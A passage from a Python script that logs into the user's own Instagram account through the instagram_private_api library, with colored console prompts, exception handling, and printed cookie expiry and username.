        print (f'[ {R}ClientLoginError{W} ] : {e}\n')
        Fix()
        sys.exit()

    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}\n')
        sys.exit()

    except Exception as e:
        print (f'[ {R}Unexpected Exception{W} ] : {e}\n')
        sys.exit()

    except KeyboardInterrupt :
        sys.exit()


    cookie_expiry = api.cookie_jar.auth_expires
    print (f"[ {G}Cookie Expiry IN{W} ] : {datetime.datetime.fromtimestamp(cookie_expiry).strftime('%Y-%m-%dT%H:%M:%SZ')}\n")

    userId = api.authenticated_user_id
    UserInfo = api.user_info(userId)

    print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])

# MAIN LOGIN V2
def LoginToInstagramV2():
    global api

    logging.basicConfig()
    logger = logging.getLogger('instagram_private_api')
    logger.setLevel(logging.WARNING)

    print (f"{Y}LOGIN TO YOUR INSTAGRAM ACCOUNT IS REQUIRED *{W}\n")
    print (f"{LB}LOGIN TO YOUR INSTAGRAM ACCOUNT FIRST{W}")
    try :
        username = input(f"{Y}	>> ENTER USERNAME : {W}").strip()
        password = input(f"{Y}	>> ENTET THE PASSWORD : {W}").strip()

        api = Client(username, password)

    except (ClientCookieExpiredError, ClientLoginRequiredError) as e:
        print (f'[ {R}COOKIES EXPIRED RE-LOGIN{W} ] : {e}\n')
        Fix()
        sys.exit()

    except ClientLoginError as e:
        print (f'[ {R}ClientLoginError{W} ] : {e}\n')
        Fix()
        sys.exit()

    except ClientError as e:
        print (f'[ {R}ClientError{W} ] : {e.msg}\n[ {R}Code{W} ] : {e.code}\n[ {R}Response{W} ] : {e.error_response}\n')
        sys.exit()

    except Exception as e:
        print (f'[ {R}Unexpected Exception{W} ] : {e}\n')
        sys.exit()

    except KeyboardInterrupt :
        sys.exit()


    cookie_expiry = api.cookie_jar.auth_expires
    print (f"[ {G}Cookie Expiry IN{W} ] : {datetime.datetime.fromtimestamp(cookie_expiry).strftime('%Y-%m-%dT%H:%M:%SZ')}\n")

    userId = api.authenticated_user_id
    UserInfo = api.user_info(userId)

    print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])
